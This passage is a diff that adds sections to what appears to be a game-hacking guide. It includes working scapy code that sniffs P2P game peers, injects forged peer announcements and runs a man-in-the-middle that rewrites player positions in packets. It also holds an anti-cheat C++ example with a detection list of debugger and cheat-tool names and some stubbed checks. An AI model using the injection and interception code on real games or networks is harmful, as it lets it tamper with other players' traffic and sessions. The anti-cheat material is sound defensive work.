+    def infer_enemy_count_by_timing(self, ai_update_addr):
+        # AI update time scales with enemy count
+        mean_time, _ = self.measure_execution_time(ai_update_addr, 100)
+        
+        # Approximate: 10ms per enemy
+        estimated_enemies = int(mean_time / 10000000)
+        
+        print(f'[+] Estimated enemy count: {estimated_enemies}')
+        return estimated_enemies
+```
+
+---
+
+## P2P Network Exploitation
+
+### Peer Discovery Manipulation
+
+```python
+from scapy.all import *
+import struct
+
+class P2PExploit:
+    def __init__(self, game_port):
+        self.game_port = game_port
+        self.peers = []
+        
+    def discover_peers(self):
+        # Sniff P2P discovery broadcasts
+        def packet_handler(packet):
+            if packet.haslayer(UDP) and packet[UDP].dport == self.game_port:
+                peer_ip = packet[IP].src
+                
+                if peer_ip not in self.peers:
+                    self.peers.append(peer_ip)
+                    print(f'[+] Discovered peer: {peer_ip}')
+        
+        sniff(filter=f'udp port {self.game_port}', prn=packet_handler, timeout=30)
+        
+        return self.peers
+    
+    def inject_fake_peer(self, target_ip, fake_peer_ip):
+        # Send fake peer announcement to target
+        packet = IP(dst=target_ip)/UDP(dport=self.game_port)/Raw(load=self.craft_peer_announcement(fake_peer_ip))
+        send(packet)
+        
+        print(f'[+] Injected fake peer {fake_peer_ip} to {target_ip}')
+    
+    def craft_peer_announcement(self, peer_ip):
+        # Example P2P announcement format
+        announcement = struct.pack('<I', 0x12345678)  # Magic
+        announcement += struct.pack('<H', 1)           # Protocol version
+        announcement += socket.inet_aton(peer_ip)      # IP address
+        announcement += struct.pack('<H', self.game_port)  # Port
+        
+        return announcement
+    
+    def mitm_p2p_connection(self, peer1_ip, peer2_ip):
+        # Intercept traffic between two peers
+        def forward_packet(packet):
+            if packet.haslayer(IP):
+                if packet[IP].src == peer1_ip and packet[IP].dst == peer2_ip:
+                    # Modify packet from peer1 to peer2
+                    modified = self.modify_game_packet(packet)
+                    send(modified)
+                    
+                elif packet[IP].src == peer2_ip and packet[IP].dst == peer1_ip:
+                    # Modify packet from peer2 to peer1
+                    modified = self.modify_game_packet(packet)
+                    send(modified)
+        
+        sniff(filter=f'host {peer1_ip} or host {peer2_ip}', prn=forward_packet)
+    
+    def modify_game_packet(self, packet):
+        # Example: Modify player position in P2P packet
+        if packet.haslayer(Raw):
+            payload = bytearray(packet[Raw].load)
+            
+            # Assume position at offset 8 (float x, y, z)
+            if len(payload) >= 20:
+                x, y, z = struct.unpack_from('<fff', payload, 8)
+                
+                # Teleport player
+                x += 100.0
+                struct.pack_into('<fff', payload, 8, x, y, z)
+                
+                packet[Raw].load = bytes(payload)
+        
+        # Recalculate checksum
+        del packet[UDP].chksum
+        del packet[IP].chksum
+        
+        return packet
+
+# Usage
+exploit = P2PExploit(7777)
+peers = exploit.discover_peers()
+exploit.inject_fake_peer(peers[0], '192.168.1.100')
+exploit.mitm_p2p_connection(peers[0], peers[1])
+```
+
+---
+
+## Anti-Cheat Development Perspective
+
+### Building Simple Anti-Cheat System
+
+```cpp
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <vector>
+#include <string>
+
+class AntiCheatSystem {
+private:
+    DWORD game_pid;
+    std::vector<DWORD> suspicious_processes;
+    
+public:
+    AntiCheatSystem(DWORD pid) : game_pid(pid) {}
+    
+    // 1. Detect known cheat tools
+    bool DetectCheatTools() {
+        const wchar_t* cheat_tools[] = {
+            L"cheatengine-x86_64.exe",
+            L"x64dbg.exe",
+            L"ollydbg.exe",
+            L"ida.exe",
+            L"ida64.exe"
+        };
+        
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        PROCESSENTRY32W pe32;
+        pe32.dwSize = sizeof(pe32);
+        
+        if (Process32FirstW(hSnapshot, &pe32)) {
+            do {
+                for (const auto& tool : cheat_tools) {
+                    if (_wcsicmp(pe32.szExeFile, tool) == 0) {
+                        CloseHandle(hSnapshot);
+                        return true;
+                    }
+                }
+            } while (Process32NextW(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return false;
+    }
+    
+    // 2. Detect debuggers
+    bool DetectDebugger() {
+        // IsDebuggerPresent
+        if (IsDebuggerPresent()) {
+            return true;
+        }
+        
+        // CheckRemoteDebuggerPresent
+        BOOL debuggerPresent = FALSE;
+        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
+        if (debuggerPresent) {
+            return true;
+        }
+        
+        // NtQueryInformationProcess
+        typedef NTSTATUS (WINAPI* NtQueryInformationProcess_t)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+        NtQueryInformationProcess_t NtQueryInformationProcess = 
+            (NtQueryInformationProcess_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
+        
+        if (NtQueryInformationProcess) {
+            DWORD debugPort = 0;
+            NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
+            if (debugPort != 0) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    // 3. Integrity checks
+    bool VerifyCodeIntegrity() {
+        HMODULE hModule = GetModuleHandle(NULL);
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+        PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
+        
+        // Calculate hash of .text section
+        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNTHeaders);
+        for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
+            if (strcmp((char*)pSection->Name, ".text") == 0) {
+                BYTE* code = (BYTE*)hModule + pSection->VirtualAddress;
+                DWORD size = pSection->Misc.VirtualSize;
+                
+                DWORD hash = CalculateCRC32(code, size);
+                
+                // Compare with known good hash
+                if (hash != 0x12345678) {  // Replace with actual hash
+                    return false;
+                }
+            }
+            pSection++;
+        }
+        
+        return true;
+    }
+    
+    // 4. Memory protection scan
+    bool ScanMemoryProtections() {
+        MEMORY_BASIC_INFORMATION mbi;
+        PBYTE address = NULL;
+        
+        while (VirtualQuery(address, &mbi, sizeof(mbi))) {
+            // Detect suspicious RWX pages
+            if (mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.Type == MEM_PRIVATE) {
+                // Potential code injection
+                return false;
+            }
+            
+            address += mbi.RegionSize;
+        }
+        
+        return true;
+    }
+    
+    // 5. Detect external processes reading memory
+    bool DetectMemoryReaders() {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(pe32);
+        
+        if (Process32First(hSnapshot, &pe32)) {
+            do {
+                if (pe32.th32ProcessID == game_pid) continue;
+                
+                // Try to open game process with PROCESS_VM_READ
+                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+                if (hProcess) {
+                    // Check if this process has handle to our process
+                    if (HasHandleToProcess(hProcess, game_pid)) {
+                        CloseHandle(hProcess);
+                        CloseHandle(hSnapshot);
+                        return true;
+                    }
+                    CloseHandle(hProcess);
+                }
+            } while (Process32Next(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return false;
+    }
+    
+    // Main scan routine
+    void RunScan() {
+        while (true) {
+            if (DetectCheatTools()) {
+                printf("[!] Cheat tool detected\n");
+                TriggerBan();
+            }
+            
+            if (DetectDebugger()) {
+                printf("[!] Debugger detected\n");
+                TriggerBan();
+            }
+            
+            if (!VerifyCodeIntegrity()) {
+                printf("[!] Code integrity check failed\n");
+                TriggerBan();
+            }
+            
+            if (!ScanMemoryProtections()) {
+                printf("[!] Suspicious memory protections\n");
+                TriggerBan();
+            }
+            
+            if (DetectMemoryReaders()) {
+                printf("[!] External memory reader detected\n");
+                TriggerBan();
+            }
+            
+            Sleep(5000);  // Scan every 5 seconds
+        }
+    }
+    
+private:
+    DWORD CalculateCRC32(BYTE* data, DWORD size) {
+        DWORD crc = 0xFFFFFFFF;
+        for (DWORD i = 0; i < size; i++) {
+            crc ^= data[i];
+            for (int j = 0; j < 8; j++) {
+                crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+            }
+        }
+        return ~crc;
+    }
+    
+    bool HasHandleToProcess(HANDLE hProcess, DWORD target_pid) {
+        // Implementation would enumerate handles
+        return false;
+    }
+    
+    void TriggerBan() {
+        // Send ban request to server
+        ExitProcess(0);
+    }
+};
+```
+
+---
+
 ## Tool Pairings
 
 | Task              | Toolchain                                      |
